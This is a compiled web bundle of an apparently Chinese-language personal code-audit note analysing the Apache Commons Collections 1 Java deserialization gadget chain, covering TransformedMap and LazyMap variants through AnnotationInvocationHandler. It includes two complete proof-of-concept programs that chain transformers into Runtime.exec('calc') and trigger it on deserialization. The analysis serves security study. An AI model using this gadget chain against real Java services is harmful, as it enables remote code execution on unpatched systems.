"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[4383],{8325:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>i,contentTitle:()=>c,default:()=>p,frontMatter:()=>o,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC1","title":"Apache Commons Collections 1","description":"\u5229\u7528\u94fe\u5206\u6790","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/01.CC1.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC1","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC1","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/01.CC1.md","tags":[],"version":"current","sidebarPosition":1,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Apache Commons Collections \u53cd\u5e8f\u5217\u5316\u5229\u7528","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/"},"next":{"title":"Apache Commons Collections 2","permalink":"/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC2"}}');var r=a(4848),s=a(8453);const o={},c="Apache Commons Collections 1",i={},l=[{value:"\u5229\u7528\u94fe\u5206\u6790",id:"\u5229\u7528\u94fe\u5206\u6790",level:2},{value:"\u56fd\u5185",id:"\u56fd\u5185",level:3},{value:"\u56fd\u5916",id:"\u56fd\u5916",level:3},{value:"CC1\u5229\u7528\u6d41\u7a0b\u56fe",id:"cc1\u5229\u7528\u6d41\u7a0b\u56fe",level:2}];function m(e){const n={code:"code",del:"del",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"apache-commons-collections-1",children:"Apache Commons Collections 1"})}),"\n",(0,r.jsx)(n.h2,{id:"\u5229\u7528\u94fe\u5206\u6790",children:"\u5229\u7528\u94fe\u5206\u6790"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"InvokerTransformer"})," \u5bf9\u5176\u6076\u610f\u8c03\u7528\u65f6\u7528\u6cd5\u4e3a\uff0c\u5982\u56fe\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bfb\u627e\u5176\u8c03\u7528transform\u65b9\u6cd5\u518d\u4f55\u5904\uff0c"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202211211826795.png-1",alt:"image-20221121161648490"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5176\u5b9e\u4e0d\u96be\u53d1\u73b0\uff0c\u8be5\u5305\u7c7b\u6709\u5f88\u591a\u5904\u90fd\u8c03\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\uff08",(0,r.jsx)(n.del,{children:"\u8fd9\u91cc\u6709\u4e24\u6761\u94fe\uff0c\u5148\u5206\u6790\u56fd\u5185\u8fd9\u6761\u94fe"}),"\uff09"]}),"\n",(0,r.jsx)(n.h3,{id:"\u56fd\u5185",children:"\u56fd\u5185"}),"\n",(0,r.jsx)(n.p,{children:"\u5176\u4e2d\u5728\u8fd9checkSetValue\u4e2d"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202211211826797.png-1",alt:"image-20221121162007507"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u4e2a\u7c7b",(0,r.jsx)(n.code,{children:"TransformedMap"}),"\u4e2d\u53ef\u4ee5\u53d1\u73b0\u8c03\u7528\u4e86transform \u53ef\u4ee5\u770b\u4e00\u4e0b\u5176\u6784\u9020\u65b9\u6cd5\u4e2d \u53c2\u6570\u662f\u5426\u53ef\u63a7\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"\n    /**\n     * Override to transform the value when using <code>setValue</code>.\n     * \n     * @param value  the value to transform\n     * @return the transformed value\n     * @since Commons Collections 3.1\n     */\n    protected Object checkSetValue(Object value) {\n        return valueTransformer.transform(value);\n    }\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7c7b \u5176\u5b9e\u662f\u5bf9 map \u7c7b\u7684 \u4e00\u4e2a\u5c01\u88c5\u7c7b\u4f3c\u4e8e\uff0ccheckSetValue\u8c03\u7528\u7684\u5c31\u662fvalueTransformer\u7684transform"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202211211826799.png-1",alt:"image-20221121162546300"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ed6\u7684\u6784\u9020\u65b9\u6cd5\u5b9e\u9645\u662f\u53ef\u63a7\u7684\uff0c\u7ee7\u7eed\u5f80\u4e0a\u627e\uff0c\u53d1\u73b0\u53ea\u6709\u4e00\u5904\u8c03\u7528\u4e86checkSetValue\uff0c\u5c31\u662f``TransformedMap",(0,r.jsx)(n.code,{children:"\u7684\u7236\u7c7b "}),"AbstractInputCheckedMapDecorator`(\u62bd\u8c61\u7c7b)"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813573.png-1",alt:"image-20230220102949587"})}),"\n",(0,r.jsxs)(n.p,{children:["\u800c MapEntry \u6211\u4eec\u77e5\u9053\u5728\u5faa\u73af\u904d\u5386\u7684\u65f6\u5019\u4f1a\u89e6\u53d1\uff0c\u6240\u4ee5\u53ea\u8981\u5bf9map\u8fdb\u884c\u904d\u5386\u5e76\u8bbe\u7f6e\u503c\u4e5f\u5c31\u4f1a\u89e6\u53d1checkSetValue\u8fd9\u4e2a\u65b9\u6cd5\u3002\u5c31\u53ef\u4ee5\u5173\u6ce8\u5230Sun\u5305\u4e0b\u9762\u7684",(0,r.jsx)(n.code,{children:"AnnotationInvocationHandler"}),"\u8fd9\u4e2a\u7c7b\uff0c\u5728readObject \u4e2d \u5faa\u73af\u904d\u5386\u7684map"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813539.png-1",alt:"image-20230220103524663"})}),"\n",(0,r.jsx)(n.p,{children:"\u800c\u8fd9\u91cc\u6709\u4e2a\u96be\u70b9\u5c31\u662f\uff0cmemberValue.setValue(value)\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u7684value\uff0c\u662fnew \u4e86\u4e00\u4e2a\u51fa\u6765\u7684\u4ee3\u7406\u7c7b\uff0c\u6240\u4ee5\u5c31\u5f88\u96be\u63a7\u5236\uff0c\u4e8e\u662f\u53c8\u53ef\u4ee5\u60f3\u5230\u4e4b\u524d\u6d89\u53ca\u5230\u7684\u4e00\u4e2a\u7c7b"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"ConstantTransformer"}),"\uff0c\u8be5\u7c7b\u7684transformer\u65b9\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56de\u56fa\u5b9a\u5bf9\u8c61\uff0c",(0,r.jsx)(n.code,{children:"ChainedTransformer"})," \u53c8\u53ef\u4ee5\u5faa\u73af\u8c03\u7528transformer\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u800c\u8fdb\u5165\u5230\u9700\u8981\u4e24\u4e2a\u6761\u4ef6"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"AnnotationInvocationHandler"}),"\u7684type\u9700\u8981\u4e00\u4e2avalue \u624d\u80fd\u8fdb\u5165\u3002"]}),"\n",(0,r.jsx)(n.li,{children:"map\u4e2d\u7684key\u503c\u4e5f\u9700\u8981\u8fd9\u4e2avalue\u7684\u503c\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'package org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\u3001\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.*;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException, IOException {\n        // \u56fd\u5185\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),\n        });\n        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();\n        objectObjectHashMap.put("value","");\n        Map decorate = TransformedMap.decorate(objectObjectHashMap, null, chainedTransformer);\n        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);\n        declaredConstructor.setAccessible(true);\n        Object o = declaredConstructor.newInstance(Target.class, decorate);\n        serialize(o);\n        unserialize("ser.bin");\n    }\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));\n        return objectInputStream.readObject();\n    }\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));\n        objectOutputStream.writeObject(obj);\n    }\n\n}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\u56fd\u5916",children:"\u56fd\u5916"}),"\n",(0,r.jsx)(n.p,{children:"\u4e0e\u56fd\u5185\u7684\u601d\u8def\u4e00\u81f4\uff0c\u4e0d\u540c\u7684\u662f\u5229\u7528\u7684map\u4e0d\u4e00\u6837\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813575.png-1",alt:"image-20230220140915373"})}),"\n",(0,r.jsxs)(n.p,{children:["\u800c\u7b26\u5408\u8fd9\u4e2a\u7684\u662f\u5728",(0,r.jsx)(n.code,{children:"AnnotationInvocationHandler"})," \u7684invoke\u65b9\u6cd5\u4e2d\uff0c\u6211\u4eec\u77e5\u9053invoke\u662f\u52a8\u6001\u4ee3\u7406\u65f6\u4f1a\u81ea\u52a8\u89e6\u53d1invoke\u65b9\u6cd5\uff0c\u521a\u597d\u8fd9\u4e2amemberValues\u4e5f\u662f\u53ef\u63a7\u5236\u7684"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813576.png-1",alt:"image-20230220141056311"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728",(0,r.jsx)(n.code,{children:"AnnotationInvocationHandler"}),"\u8fd9\u4e2a\u7c7b\u5957\u4e0a\u4e00\u5c42\u4ee3\u7406\u7c7b\uff0c\u4e8e\u662f\u4ee3\u7801\u8d70\u5230entrySet()\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1invoke\u65b9\u6cd5\u3002\u6210\u529f\u6267\u884c\u4f1a\u5e8f\u4ee3\u7801"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813577.png-1",alt:"image-20230220141206343"})}),"\n",(0,r.jsx)(n.p,{children:"\u5b8c\u6574POC"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'package org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC1 {\n    public static void main(String[] args) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, ClassNotFoundException, IOException {\n        //        \u56fd\u5916\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),\n        });\n        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();\n        Map<?,?> decorate =  LazyMap.decorate(objectObjectHashMap, chainedTransformer);\n        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");\n        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);\n        declaredConstructor.setAccessible(true);\n        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);\n        Map proxyMap= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, o);\n        Object o1 = declaredConstructor.newInstance(Override.class, proxyMap);\n        serialize(o1);\n        unserialize("ser.bin");\n    }\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));\n        return objectInputStream.readObject();\n    }\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));\n        objectOutputStream.writeObject(obj);\n    }\n'})}),"\n",(0,r.jsx)(n.h2,{id:"cc1\u5229\u7528\u6d41\u7a0b\u56fe",children:"CC1\u5229\u7528\u6d41\u7a0b\u56fe"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202302211813578.png-1",alt:"image-20230220171022413"})})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(m,{...e})}):m(e)}},8453:(e,n,a)=>{a.d(n,{R:()=>o,x:()=>c});var t=a(6540);const r={},s=t.createContext(r);function o(e){const n=t.useContext(s);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);